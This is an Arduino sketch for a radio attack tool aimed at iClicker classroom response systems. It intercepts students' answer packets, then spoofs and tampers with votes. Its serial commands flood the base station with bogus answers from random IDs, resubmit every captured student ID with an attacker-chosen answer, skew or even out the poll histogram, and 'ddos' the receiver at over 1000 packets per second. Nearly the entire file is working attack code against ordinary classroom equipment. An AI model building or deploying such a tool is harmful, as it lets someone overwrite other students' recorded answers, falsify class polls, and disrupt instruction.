#include <Arduino.h>
#include <SPI.h>
#include <stdint.h>
#include <iClickerEmulator.h>
#include <RingBufCPP.h>
#include "charUtils.h"
#include "memory.h"
#include "list.h"
#include "hashtable.h"

// iClicker channel id macro - useful for switch statements
constexpr uint16_t _iid(char* c) {
  return ((uint16_t)c[0]) << 8 | c[1];
}

// iClicker id macro
uint32_t collapseId(uint8_t* id) {
  // TODO: ignore last byte since it's dependant on first 3?
  return id[0] << 24 | id[1] << 16 | id[2] << 8 | id[3];
}
void expandId(uint32_t id, uint8_t* ida) {
  ida[0] = (id & 0xff000000) >> 24;
  ida[1] = (id & 0x00ff0000) >> 16;
  ida[2] = (id & 0x0000ff00) >> 8;
  ida[3] =  id & 0x000000ff;
}

// Radio properties
#define IS_RFM69HW true //make true if using w version
#define IRQ_PIN 3 // This is 3 on adafruit feather
#define CSN 8 // This is 8 on adafruit feather

// Other hardware properties
#define LED 13
bool LED_on = false;

// Channel we're going to operate on
iClickerChannel Channel = iClickerChannels::AA;

// iClicker instance
iClickerEmulator Clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

// Buffer for incoming serial commands
const int SerialBufLen = 100;
char SerialBuf[SerialBufLen + 1];

// Utility buffer to be reused later
const int UBufLen = 100;
char UBuf[UBufLen + 1];

// Database of iClicker ids belonging to other students
// TODO implement later. Or just make the responses hashTable persist after reset and change answer
// value.
//list<long> clickerIdDatabase;

iClickerAnswer Answers[] = { ANSWER_A, ANSWER_B, ANSWER_C, ANSWER_D, ANSWER_E };

// Current poll status info
// Store number of each answer in array for quick access
int poll[5];
int nResponses;

// Maintain hash map for unique IDs
hashTable<char> responses(100); // Probably at most 300 responses? 100 should be a good size...

// user id hash table size: 400
// bogus hash size: 4000

// Poll methods
void resetPoll() {
  for(int i = 0; i < 5; i++)
    poll[i] = 0;
  nResponses = 0;
  responses.clear();
}
void updatePoll(uint8_t* id, char a) {
  // Update the entry in the hash table and update local counters
  tableEntry<char>* entry = responses.getEntry(collapseId(id));
  if(entry == null) {
    responses.set(collapseId(id), a);
    nResponses++;
  } else {
    poll[entry->value - 65]--;
    entry->value = a;
  }
  // We know a >= 'A' && a <= 'E'
  poll[a - 65]++;
}

// Operation
enum Operation { flood, trickle, changeall, force, eq, ddos, idle };

Operation operation = idle;
char operationMode = null;
// Let operation keep track of where it is...
int operationCounter;
int seqCounter;
//void* operationState;

// Program config
#define MAX_BUFFERED_PACKETS 50
#define REPLY_TO_CLICKERS false

// Packet buffer for intercepted packets
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> RecvBuf;

void printCommas(int n) {
  if(n < 1000)
    Serial.printf("%d", n);
  else {
    printCommas(n / 1000);
    Serial.printf(",%03d", n % 1000);
  }
}

void printFreeMemory() {
  int f = freeMemory();
  Serial.print("Free memory: ");
  printCommas(f);
  Serial.println(" bytes");
}

void printHelpMessage() {
  Serial.println("┌ help             Prints this help message");
  Serial.println("│ setchannel <ch>  Changes the operating channel");
  Serial.println("│ status           Prints poll status");
  Serial.println("│ reset            Resets current poll state");
  Serial.println("│ abort            Cancels the current operation");
  Serial.println("├──────────┤");
  Serial.println("│ flood <mode>     Floods base station with mode in answer, random, uniform, "
    "seq");
  Serial.println("│ trickle <mode>   Slowly sends bogus answers with mode in answer, random, "
    "uniform, seq");
  Serial.println("│ changeall <ans>  Changes all submitted answers to the given answer (or "
    "uniform)");
  Serial.println("│ force <ans>      Quickly resubmits all incoming answers as ans");
  Serial.println("│ bounce           Causes the bar plot to bounce");
  Serial.println("│ ddos             Attempts to flood base station with more than 1000 "
    "responses/sec");
  Serial.println("└ eq               Evens out the histogram");
}

void handlePackets() {
  char msg[50];
  iClickerPacket r;
  while (RecvBuf.pull(&r)) {
    uint8_t* id = r.packet.answerPacket.id;
    iClickerAnswer ans = r.packet.answerPacket.answer;
    char answer = iClickerEmulator::answerChar(ans);
    snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' :
      'r', id[0], id[1], id[2], id[3], answer);
    Serial.println(msg);
    if(operation == force) {
      Clicker.submitAnswer(id, Answers[operationMode - 'a']);
      updatePoll(id, operationMode);
      // Promiscuous is re-engaged later in loop...
    } else if(answer != 'P' && answer != 'X') // answer is in {'A', 'B', 'C', 'D', 'E', 'P', 'X'}
      updatePoll(id, answer);
  }
}

bool loadCommand() {
  // Loads command from serial input into SerialBuf
  // Returns true if loaded successfully
  int i = 0;
  int c;
  while(Serial.available() && i < SerialBufLen)
    if((c = Serial.read()) == 0xa) // End char is 0xa == "\n"
      break;
    else
      SerialBuf[i++] = c;
  if(i <= SerialBufLen)
    // If we didn't overrun the buffer, add the null terminator back in
    SerialBuf[i] = 0x0;
  else {
    // If we did overrun the buffer, clear any remaining data in the Serial
    while(Serial.available())
      Serial.read();
    Serial.println("[Error] Serial larger than buffer");
    // A command shouldn't be longer than the buffer length...
    return false;
  }
  return true;
}

void handleCommand() {
  // Convert the whole command to lowercase
  cToLower(SerialBuf);
  // Load the actual command part into UBuf
  int cmdi = getFragment(SerialBuf, 0, UBuf);
  // Handle command
  if(cEquals(UBuf, "help")) {
    printHelpMessage();
  } else if(cEquals(UBuf, "setchannel")) {
    // Load argument into UBuf
    getFragment(SerialBuf, cmdi, UBuf);
    bool known = true;
    switch(_iid(UBuf)) { // This switch statement sucked to write and sucks to look at
      case _iid("aa"):
        Channel = iClickerChannels::AA;
        break;
      case _iid("ab"):
        Channel = iClickerChannels::AB;
        break;
      case _iid("ac"):
        Channel = iClickerChannels::AC;
        break;
      case _iid("ad"):
        Channel = iClickerChannels::AD;
        break;
      case _iid("ba"):
        Channel = iClickerChannels::BA;
        break;
      case _iid("bb"):
        Channel = iClickerChannels::BB;
        break;
      case _iid("bc"):
        Channel = iClickerChannels::BC;
        break;
      case _iid("bd"):
        Channel = iClickerChannels::BD;
        break;
      case _iid("ca"):
        Channel = iClickerChannels::CA;
        break;
      case _iid("cb"):
        Channel = iClickerChannels::CB;
        break;
      case _iid("cc"):
        Channel = iClickerChannels::CC;
        break;
      case _iid("cd"):
        Channel = iClickerChannels::CD;
        break;
      case _iid("da"):
        Channel = iClickerChannels::DA;
        break;
      case _iid("db"):
        Channel = iClickerChannels::DB;
        break;
      case _iid("dc"):
        Channel = iClickerChannels::DC;
        break;
      case _iid("dd"):
        Channel = iClickerChannels::DD;
        break;
      default:
        // Channel is unknown
        Serial.print("[Error] Unknown channel \"");
        Serial.print(UBuf);
        Serial.println("\"");
        known = false;
        break;
    }
    if(known) {
      // Actually change the channel
      Clicker.setChannel(Channel);
      // Restart promiscuous
      Clicker.stopPromiscuous();
      Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
      // Reply
      cToUpper(UBuf); // Convert channel name to uppercase
      Serial.print("Switched to channel \"");
      Serial.print(UBuf);
      Serial.println("\"");
    }
  } else if(cEquals(UBuf, "status")) {
    Serial.printf("Responses: %d\n", nResponses);
    // Print out poll status
    for(int i = 0; i < 5; i++) {
      Serial.print((char)(i + 65));
      Serial.print(" - ");
      Serial.println(poll[i]);
    }
    // Some system info
    printFreeMemory();
  } else if(cEquals(UBuf, "mapstatus")) {
    // For debug purposes......
    Serial.printf("nBins: %d\n", responses.getNBins());
    list<tableEntry<char>*>* bins = responses.getBins();
    int c = 0;
    for(int i = 0, l = responses.getNBins(); i < l; i++) {
      Serial.print(bins[i].getLength());
      if(i == l - 1 || (c = (c + 1) % 20) == 0)
        Serial.print("\n");
      else
        Serial.print(", ");
    }
  } else if(cEquals(UBuf, "reset")) {
    Serial.println("Resetting poll");
    // Reset poll status
    resetPoll();
    // Reset current operation? I guess why not...
    operation = idle;
    operationMode = null;
  } else if(cEquals(UBuf, "abort")) {
    Serial.println("Aborting current operation");
    // Cancel current operation?
    operation = idle;
    operationMode = null;
  } else if(cEquals(UBuf, "flood")) {
    Serial.println("Starting flood");
    // Extract parameter
    getFragment(SerialBuf, cmdi, UBuf);
    // Only really need to look at first char
    if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
        UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
      operation = flood;
      operationMode = UBuf[0];
      seqCounter = 0;
    } else {
      Serial.print("[Error] Unknown flood mode \"");
      Serial.print(UBuf);
      Serial.println("\"");
    }
  } else if(cEquals(UBuf, "trickle")) {
    Serial.println("Starting trickle");
    // Extract parameter
    getFragment(SerialBuf, cmdi, UBuf);
    // Only really need to look at first char
    if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
        UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
      operation = flood;
      operationMode = UBuf[0];
      operationCounter = 0;
      seqCounter = 0;
    } else {
      Serial.print("[Error] Unknown trickle mode \"");
      Serial.print(UBuf);
      Serial.println("\"");
    }
  } else if(cEquals(UBuf, "changeall")) {
    Serial.println("Starting changeall");
    // Extract parameter
    getFragment(SerialBuf, cmdi, UBuf);
    // Only really need to compare first char
    if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
        UBuf[0] == 'e' || UBuf[0] == 'u') {
      operation = changeall;
      operationMode = UBuf[0];
    } else {
      Serial.print("[Error] Unknown changeall mode \"");
      Serial.print(UBuf);
      Serial.println("\"");
    }
  } else if(cEquals(UBuf, "force")) {
    Serial.println("Starting force");
    // Extract parameter
    getFragment(SerialBuf, cmdi, UBuf);
    if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
        UBuf[0] == 'e') {
      operation = force;
      operationMode = UBuf[0];
    } else {
      Serial.print("[Error] Unknown flood mode \"");
      Serial.print(UBuf);
      Serial.println("\"");
    }
  } else if(cEquals(UBuf, "ddos")) {
    Serial.println("Starting ddos");
    // Set operation
    operation = ddos;
  } else if(cEquals(UBuf, "eq")) {
    Serial.println("Starting equalization");
    // Set operation
    operation = eq;
  } else {
    Serial.print("[Error] Unknown command \"");
    Serial.print(UBuf);
    Serial.println("\"");
  }
}

void recvPacketHandler(iClickerPacket *recvd) {
  #if REPLY_TO_CLICKERS
  // Send acknowledgement to clicker. Acting as a base station.
  // It might make sense to move this to the loop, however it is important that the
  // acknowledgement is sent quickly.
  if (recvd->type == PACKET_ANSWER) {
    Clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
    // restore the frequency back to AA and go back to promiscous mode
    Clicker.setChannel(Channel);
    Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  }
  #endif
  // Add packet to the buffer
  RecvBuf.add(*recvd);
}

void command_flood() {
  // Flood the base station with a ton of answers
  // Not DDOS level, but a lot
  // Send about 200 responses per second
  // ~20 per loop
  for(int i = 0; i < 20; i++) {
    iClickerAnswer answer;
    switch(operationMode) {
      case 'a':
        answer = ANSWER_A;
        break;
      case 'b':
        answer = ANSWER_B;
        break;
      case 'c':
        answer = ANSWER_C;
        break;
      case 'd':
        answer = ANSWER_D;
        break;
      case 'e':
        answer = ANSWER_E;
        break;
      case 'r':
        answer = iClickerEmulator::randomAnswer();
        break;
      case 'u':
        { // creating variables will node a scope
          int max = 0;
          int maxAnsi;
          for(int i = 0; i < 5; i++)
            if(poll[i] >= max) {
              max = poll[i];
              maxAnsi = i;
            }
          iClickerAnswer maxAns = Answers[maxAnsi];
          do
            answer = iClickerEmulator::randomAnswer();
          while(answer != maxAns);
        }
        break;
      case 's':
        answer = Answers[seqCounter];
        seqCounter = (seqCounter + 1) % 5;
        break;
    }
    uint8_t id[4];
    iClickerEmulator::randomId(id);
    Clicker.submitAnswer(id, answer);
    updatePoll(id, answer);
  }
}

void command_trickle() {
  // Slowly sends bogus answers to base station
  // Send about 5 per second
  operationCounter++;
  if(operationCounter %= 2) {
    iClickerAnswer answer;
    switch(operationMode) {
      case 'a':
        answer = ANSWER_A;
        break;
      case 'b':
        answer = ANSWER_B;
        break;
      case 'c':
        answer = ANSWER_C;
        break;
      case 'd':
        answer = ANSWER_D;
        break;
      case 'e':
        answer = ANSWER_E;
        break;
      case 'r':
        answer = iClickerEmulator::randomAnswer();
        break;
      case 'u':
        { // creating variables will node a scope
          int max = 0;
          int maxAnsi;
          for(int i = 0; i < 5; i++)
            if(poll[i] >= max) {
              max = poll[i];
              maxAnsi = i;
            }
          iClickerAnswer maxAns = Answers[maxAnsi];
          do
            answer = iClickerEmulator::randomAnswer();
          while(answer != maxAns);
        }
        break;
      case 's':
        answer = Answers[seqCounter];
        seqCounter = (seqCounter + 1) % 5;
        break;
    }
    uint8_t id[4];
    iClickerEmulator::randomId(id);
    Clicker.submitAnswer(id, answer);
    updatePoll(id, answer);
  }
}

void command_changeall() {
  // Changes all answers to a given answer
  // Changes both student IDs and fake IDs
  // Just do it all in one go. Hopefully don't miss too much in the process...
  if(operationMode >= 'a' && operationMode <= 'e') {
    iClickerAnswer answer = Answers[operationMode - 'a'];
    list<int>* keys = responses.getKeys();
    listNode<int>* node = keys->getHead();
    int id;
    uint8_t ida[4];
    if(node != null)
      do {
        id = node->getContent();
        expandId(id, ida);
        Clicker.submitAnswer(ida, answer);
        updatePoll(ida, operationMode);
      } while(node = node->getNext());
  } else {
    // then uniform
    int answer = 0;
    list<int>* keys = responses.getKeys();
    listNode<int>* node = keys->getHead();
    int id;
    uint8_t ida[4];
    if(node != null)
      do {
        id = node->getContent();
        expandId(id, ida);
        Clicker.submitAnswer(ida, Answers[answer % 5]);
        updatePoll(ida, iClickerEmulator::answerChar(Answers[answer % 5]));
        answer++;
      } while(node = node->getNext());
  }
}

void command_eq() {
  // Attempts to equalize histogram using bogus answers
  // About 160 responses per second max
  int max = 0;
  for(int i = 0; i < 5; i++)
    if(poll[i] > max)
      max = poll[i];
  uint8_t id[4];
  for(int i = 0; i < 4; i++)
    for(int j = 0; j < 5; j++)
      if(poll[j] < max) {
        iClickerEmulator::randomId(id);
        Clicker.submitAnswer(id, Answers[j]);
        updatePoll(id, Answers[j]);
      }
}

void command_ddos() {
  // Attempts to flood base station with more than 1000 submissions per second
  Serial.println("Send any data over serial to abort.");
  // Generate new random ID for ddos
  uint8_t id[4];
  iClickerEmulator::randomId(id);
  int i;
  while(!Serial.available()) { // Stop when input is received from serial
    unsigned long start = micros();
    i = 1000;
    while(i--) {
      // Send bogus packet
      Clicker.submitAnswer(id, iClickerAnswer::ANSWER_A);
    }
    unsigned long end = micros();
    // delta / 1000 = microseconds / packet = A
    // 1000000 microseconds / A = packets per second?
    Serial.println(1000000 / ((end - start) / 1000));
  }
  // we don't care about that input - clear it
  while(Serial.available()) Serial.read();
  // Inform user that ddos is finished
  Serial.println("\nFinished ddos");
  operation = idle;
  updatePoll(id, 'a');
}

// Main code
void setup() {
  // Setup LED
  pinMode(LED, OUTPUT);
  digitalWrite(LED, HIGH);
  // Setup Serial
  Serial.begin(9600);
  while (!Serial) ; // Wait for serial port to be available
  Serial.println("Hello.");
  // Setup poll status
  resetPoll(); // Just make sure everything is zeroed
  // Setup serial buffer
  SerialBuf[SerialBufLen] = 0x0; // just for thouroughness
  // Setup clicker
  Clicker.begin(Channel);
  Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  Serial.println("Started promiscouous.");
  // Print help message
  printHelpMessage();
}

void loop() {
  // Blink led
  //digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);

  // Process packets
  handlePackets();

  // Handle any serial commands
  if(Serial.available()) {
    if(loadCommand()) {
      // Echo command back
      Serial.print("--> ");
      Serial.println(SerialBuf);
      handleCommand();
    }
  }

  // Handle operation
  if(operation != idle) {
    switch(operation) {
      case flood:
        command_flood();
        break;
      case trickle:
        command_trickle();
        break;
      case changeall:
        command_changeall();
        break;
      case eq:
        command_eq();
        break;
      case ddos:
        command_ddos();
        break;
    }
    // TODO: Book keeping of bogus answers
    // All operations involve transmission. Promiscouous mode needs to be restarted.
    Clicker.setChannel(Channel);
    Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  }

  // Pause for a little bit
  delay(100);
}
